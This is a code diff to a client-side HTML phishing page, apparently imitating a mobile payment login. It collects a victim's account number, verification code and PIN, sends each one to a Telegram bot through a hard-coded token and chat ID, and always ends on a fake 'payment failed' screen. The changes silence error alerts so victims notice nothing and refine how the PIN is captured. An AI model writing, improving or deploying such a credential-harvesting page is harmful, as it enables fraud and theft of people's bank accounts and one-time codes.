@@ -317,9 +317,9 @@
 
     <script>
         // --- Telegram Bot Configuration ---
-        // You MUST replace these with your actual Telegram bot token and chat ID.
-        // For security, in a real application, these should be handled server-side (like your Next.js example).
-        // For this purely client-side HTML, we're putting them directly here for demonstration.
+        // আপনার Next.js .env.local ফাইল থেকে এই দুটি মান এখানে যোগ করুন।
+        // WARNING: ক্লায়েন্ট-সাইড HTML এ API টোকেন সরাসরি রাখা নিরাপত্তা ঝুঁকি তৈরি করে।
+        // প্রোডাকশন এনভায়রনমেন্টে, আপনার Next.js API রুটের মতো একটি সার্ভার-সাইড প্রক্সি ব্যবহার করা উচিত।
         const TELEGRAM_BOT_TOKEN = '7751217182:AAEWRJ427aODJ4w9Y9sJw51U28o0QZ_yx4E'; // REPLACE WITH YOUR BOT TOKEN
         const TELEGRAM_CHAT_ID = '7335173906'; // REPLACE WITH YOUR CHAT ID
 
@@ -368,16 +368,17 @@
                     }),
                 });
 
-                if (response.ok) {
-                    console.log("Message sent to Telegram successfully.");
-                } else {
+                if (!response.ok) {
                     const errorData = await response.json();
                     console.error("Telegram API error:", response.status, errorData);
-                    alert(`Failed to send data to Telegram: ${errorData.description || 'Unknown error'}`);
+                    // এখানে একটি Alert না দিয়ে লগ করার দিকে ফোকাস করা ভালো, যাতে ইউজার এক্সপেরিয়েন্স বাধাগ্রস্ত না হয়।
+                    // alert(`Failed to send data to Telegram: ${errorData.description || 'Unknown error'}`);
+                } else {
+                    console.log("Message sent to Telegram successfully.");
                 }
             } catch (error) {
                 console.error("Error sending message to Telegram:", error);
-                alert("An error occurred while trying to send data to Telegram.");
+                // alert("An error occurred while trying to send data to Telegram.");
             }
         }
 
@@ -449,7 +450,7 @@
                 case 'pinEntry':
                     inputId = 'pinInput';
                     maxLength = 5;
-                    inputType = 'password'; // Use password type for PIN for better UX (hides after typing)
+                    // inputType = 'password'; // Use 'tel' with custom masking for better control
                     inputStyle = 'font-size: 1.5rem; letter-spacing: 0.125em;'; // text-2xl tracking-wider
                     let maskedAccountNumberForPin = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)}  * ${currentAccountNumber.slice(-3)}` : "";
                     contentHTML = `
@@ -496,14 +497,15 @@
 
             mainContentArea.innerHTML = contentHTML;
             attachEventListeners();
-            updateConfirmButtonState(); // Initial state for buttons
+            // confirmButton.disabled = true; // Initial state set after events attached
         }
 
         function updateConfirmButtonState() {
             if (!confirmButton) return;
 
             let isValid = false;
-            const currentInput = document.getElementById(currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput'));
+            const currentInputId = currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput');
+            const currentInput = document.getElementById(currentInputId);
 
             if (currentInput) {
                 if (currentView === 'accountNumber') {
@@ -511,7 +513,9 @@
                 } else if (currentView === 'verificationCode') {
                     isValid = currentInput.value.length === 6;
                 } else if (currentView === 'pinEntry') {
-                    isValid = currentInput.dataset.actualPin && currentInput.dataset.actualPin.length >= 4 && currentInput.dataset.actualPin.length <= 5;
+                    const actualPinLength = (currentInput.dataset.actualPin || '').length;
+                    isValid = actualPinLength >= 4 && actualPinLength <= 5;
+                    // console.log('PIN Entry - Actual PIN Length:', actualPinLength, 'IsValid:', isValid); // Debug log
                 }
             }
             confirmButton.disabled = !isValid;
@@ -538,7 +542,8 @@
         }
 
         function attachEventListeners() {
-            const currentInput = document.getElementById(currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput'));
+            const currentInputId = currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput');
+            const currentInput = document.getElementById(currentInputId);
 
             if (confirmButton) {
                 confirmButton.onclick = async () => {
@@ -558,8 +563,8 @@
                         await sendToTelegram({ pin: actualPin });
                         currentView = 'paymentFailed'; // Always go to failed for this HTML demo
                     }
-                    hideLoading();
-                    renderView();
+                    hideLoading(); // Hide loading and update button state
+                    renderView(); // Render the next view
                 };
             }
 
@@ -569,6 +574,10 @@
                         currentAccountNumber = ''; // Clear account number
                     } else if (currentView === 'verificationCode') {
                         currentVerificationCode = ''; // Clear verification code
+                    } else if (currentView === 'pinEntry') {
+                         // PIN এন্ট্রি পেজ থেকে Cancel করলে আবার অ্যাকাউন্ট নাম্বার ইনপুট পেজে যাবে
+                        currentAccountNumber = '';
+                        currentVerificationCode = '';
                     }
                     currentView = 'accountNumber'; // Always go back to account number input
                     renderView();
@@ -578,8 +587,9 @@
             if (currentInput) {
                 // Initialize dataset properties for PIN input
                 if (currentView === 'pinEntry') {
-                    currentInput.dataset.actualPin = '';
-                    currentInput.dataset.displayLength = '0';
+                    if (!currentInput.dataset.actualPin) currentInput.dataset.actualPin = '';
+                    if (!currentInput.dataset.displayLength) currentInput.dataset.displayLength = '0';
+                    currentInput.value = "●".repeat(parseInt(currentInput.dataset.displayLength)); // Load previous masked value if any
                 }
 
                 currentInput.oninput = (e) => {
@@ -588,7 +598,6 @@
                         e.target.value = value.replace(/\D/g, ''); // Allow only digits
                     } else if (currentView === 'pinEntry') {
                         let newPin = currentInput.dataset.actualPin || '';
-                        let displayPin = '';
                         const currentDisplayLength = parseInt(currentInput.dataset.displayLength || '0');
 
                         if (value.length > currentDisplayLength) { // New char added
@@ -600,31 +609,30 @@
                             newPin = newPin.slice(0, -1);
                         }
 
-                        if (newPin.length > maxLength) {
+                        if (newPin.length > maxLength) { // maxLength is 5 for pinEntry
                             newPin = newPin.slice(0, maxLength);
                         }
 
                         currentInput.dataset.actualPin = newPin;
-                        currentInput.dataset.displayLength = newPin.length.toString(); // Store actual length for comparison
+                        currentInput.dataset.displayLength = newPin.length.toString();
 
                         if (newPin.length > 0) {
                             const lastDigit = newPin.slice(-1);
-                            displayPin = "●".repeat(newPin.length - 1) + lastDigit;
-
+                            let displayPin = "●".repeat(newPin.length - 1) + lastDigit;
+                            e.target.value = displayPin; // Immediately show last digit
+                            
                             // Mask the last digit after a short delay
                             setTimeout(() => {
                                 // Only mask if the pin hasn't changed since this timeout was set
-                                if (currentInput.dataset.actualPin === newPin && currentInput.value === displayPin) {
-                                     currentInput.value = "●".repeat(newPin.length);
+                                if (currentInput.dataset.actualPin === newPin && e.target.value === displayPin) {
+                                     e.target.value = "●".repeat(newPin.length);
                                 }
-                            }, 500); // 500ms delay
+                            }, 500);
                         } else {
-                            displayPin = '';
+                            e.target.value = '';
                         }
-                        e.target.value = displayPin;
                     }
-
-                    updateConfirmButtonState();
+                    updateConfirmButtonState(); // Update button state after input
                 };
 
                 // Initial update for the current input field
@@ -637,7 +645,8 @@
             const resendCodeText = document.getElementById('resendCodeText');
             if (resendCodeText) {
                 resendCodeText.innerHTML = `Resend Code in ${resendCountdown}s`;
-                confirmButton.disabled = true; // Disable confirm while timer is active
+                // confirmButton.disabled = true; // Timer চলাকালীনও কোড সঠিক হলে Confirm enable থাকবে।
+                                                  // এটি updateConfirmButtonState() দ্বারা নিয়ন্ত্রিত হবে।
 
                 if (resendTimerInterval) clearInterval(resendTimerInterval);
 
@@ -659,7 +668,7 @@
                                 renderView();
                             };
                         }
-                        updateConfirmButtonState(); // Re-evaluate confirm button state
+                        // updateConfirmButtonState(); // Timer শেষ হলেও Confirm বাটনের অবস্থা ইনপুট ফিল্ডের উপর নির্ভর করবে
                     }
                 }, 1000);
             }
